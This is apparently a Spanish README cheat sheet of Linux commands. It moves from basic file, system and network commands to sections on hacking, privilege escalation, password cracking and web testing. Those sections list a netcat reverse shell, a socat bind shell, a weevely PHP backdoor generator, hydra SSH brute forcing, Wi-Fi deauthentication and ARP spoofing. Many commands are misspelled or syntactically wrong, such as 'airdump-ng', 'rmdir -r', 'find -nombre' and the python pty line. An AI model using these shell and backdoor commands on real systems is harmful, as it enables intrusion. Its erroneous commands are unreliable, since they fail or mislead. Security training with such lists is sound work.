# C0digo-b4sico
# 01. Código de comandos básicos para Linux:
   
* `pwd` - Directorio actual
* `ls` - Lista los archivos del directorio
* `cd` - Cambia de directorio
* `mkdir <carpeta>` - Crea una carpeta
* `rm <archivo>` - Borra un archivo
* `rmdir -r <carpeta>`- Borra una carpeta
* `cp <archivo> <destino>` - Copia archivos
* `mv <archivo> <destino>` - mueve/cambia de nombre archivos
* `touch <archivo>` - Crea un archivo
* `cat <archivo>` - Muestra el contenido de un archivo
* `nano <archivo>` - Editor de archivo Nano
* `vim <archivo>` - Editor de archivo Vim
* `find / -nombre <archivo>` - Busca un archivo
* `grep "texto" <archivo>` - Busca un texto en un archivo 
* `history` - Muestra la historia de comandos

# 02. Comandos de información del sistema:

* `uname -a` - Muestra información del sistema
* `whoami` - Muestra el usuario actual
* `id `- Muestra el ID del usuario y del grupo
* `ptime` - Muestra la cantidad de tiempo del sistema está operativo
* `df -h` - Muestra el uso del disco
* `du -sh` <carpeta> - Muestra el tamaño de una carpeta
* `top` - Muestra procesos activos
* `ps aux` - Lista los procesos que se están ejecutando
* `kill <ID proceso>` - Termina un proceso
* `htop` - Gestion de procesos interactivos

# 03. Uso de comandos de gestión:

* `adduser <usuario>` - Añade un nuevo usuario
* `deluser <usuario>` - Elimina un usuario
* `passwd <usuario>` - Cambia la contraseña
* `usermod -aG sudo <usuario>` - Da acceso de superusuario
* `groups <usuario>` - Muestra los grupos del usuario
* `chmod 777 <archivo>` - Cambia los permisos del archivo
* `chown usuario:grupo <archivo>` - Cambia el dueño del archivo

# 04. Comandos en redes:

* `ifconfig` - Muestra la interfaz de la red
* `ip a` - Muestra la dirección IP
* `iwconfig` - Muestra la interfaz wifi
* `ping <IP>` - Test de conexión IP
* `netstat -tulnp` - Muestra los puertos abiertos
* `nmap <IP>` - Escanea los puertos abierto del objetivo
* `traceroute <IP>` - Traza una ruta a un host
* `curl <URL>` - Busca datos de una URL
* `wget <URL>` - Descarga un archivo
* `dig <dominio>` - Obtiene infomacion DNS
* `nslookup <dominio>` - Realiza una busqueda de DNS

# 05. Comandos de Hacking & Test de Penetración:

* `msfconsole` - Inicia Mestasploit
* `msfvenom` - Genera cargas útiles (payloads)
* `searchsploit <exploit>` - Busca exploits
* `sqlmap -u <URL> --dbs` - Test de SQL injection
* `hydra -l user -P pass.txt <IP> shh` - SSH de fuerza bruta
* `john --wordlist=rockyou.txt hash.txt` - Crackea hashes
* `airmon-ng start wlan0` - Permite modo monitorización
* `airdump-ng wlan0mon` - Captura paquetes wifi
* `airplay-ng -0 10 -a <BSSID> wlan0mon` - Desautentica clientes
* `aircrack-ng -w rockyou.txt -b <BSSID> <archivo_capturado>` - Crackea contraseña WIFI
* `hashcat -m 2500 hash.txt rockyou.txt` - Cracka hashes usando GPU
* `ettercap -T -q -i eth0` - Realiza una suplantación de ARP
* `driftnet -i eth0` - Captura imágenes del trafico de red
* `tcpdump -i eth0` - Captura paquetes de red
* `tshark -i eth0` - Analisis del trafico de red
* `nikto -h <URL>` - Escanea nulnerabilidades de servidores web
* `gobuster dir -u <URL> -w /urs/share/wordlists/dirb/common.txt` - Fuerza bruta de la carpeta
* `wpscan --url <URL>` - Escanea vulnerabilidades en WordPress

#06. Escalada de Privilegios & Post-Explotaciones:

* `sudo -l` - Muestr los privilegios de superusuario
* `sudo su` - Cambia a usuario root
* `python -c 'import pty:pty.spawn("/bin/bash/")'` - Habilita el shell/terminal
* `nc -lvnp <puerto>` - Empieza un Netcat de escucha
* `nc <IP> <puerto> -e /bin/bash` - Shell inverso
* `meterpreter> getuid` - Muestra el usuario actual en Meterpreter
* `meterpreter> getsystem` - Intenta escalar privilegios
* `meterpreter> upload / download <archivo>` - Transfiere archivos
* `merterpreter> shell` - Obterner shell/terminal del sistema
* `linux-exploit-suggester` - Sugiere exploits para escalada de privilegios

# 07. Cifrado de Archivos & Datos:

* `gpg -c <archivo>` - Cifra un archivo
* `gpg -d <archivo.gpg>` - Descifra un archivo
* `openssl enc -aes-256-cbc -salt -in <archivo> -out <archivo.enc>` -  Cifra usando OpenSSL
* `openssl enc -d -aes-256-cbc -salt -in <archivo.enc> -out <archivo>` - Descifra el archivo

# 08. Forense & Esteganografía:

* `string <archivo>` - Extrae los strigns de un archivo
* `binwalk <archivo>` - Analiza binarios
* `foremost -i <imagen>` - Extrae archivos de una imagen
* `exiftool <archivo>` - Muestra los metadatos de un archivo
* `stegseek <archivo steg/stegfile>` - Detecta datos ocultos en una imagen

# 09. Cracking de Contraseñas & Hashes:

* `hashid <hash>` - Identifica el tipo de hash
* `hydra -L users.txt -P passwords.txt ssh://<IP>` - Fuerza bruta SSH
* `john hash.txt --wordlists=rockyou.txt` - Crackea hashes de contraseñas

# 10. Tests de Aplicaciones Web:

* `dir <URL>` - Enumeracion de carpetas
* `wfuzz -c -z file,wordlists.txt --hc 404 <URL>/FUZZ` - Web fuzzing
* `xsssniper -u <URL>` - Test para XSS
* `commix --url <URL>` - Test de inyección de comandos
* `burpsuite` - Test con Burp Suite

# Varios:

* `crunch 8 8 abcdefghijklmnopqrstuvwxyz` - Genera una wordlist
* `proxychains nmap -sT -Pn <IP>` - Usa proxychains con Nmap
* `tor` - Abre navegador Tor
* `mitmproxy` - Empieza un proxy de man-in-the-middle
* `setoolkit` - Comienza una Ingenieria Social con Toolkit
* `cewl -w words.txt -d 5 <URL>` - Genera una lista de palabras personalizadas
* `weevely generate password backdoor.php` - Crea una backdoor en una web
* `socat TCP-LISTEN:4444,fork EXEC:/bin/bash` - Une el shell
* `whois <dominio>` - Da información sobre el dominio
* `theHarvester -d <dominio> -l 100 -b google` - Recolecta información sobre email y subdominios
* `fcrackzip -u -D -p rockyou.txt <archivo.zip>` - Crackea una contraseña de un archivo .zip
* `dnscan -d <dominio>` - Muestra subdominios
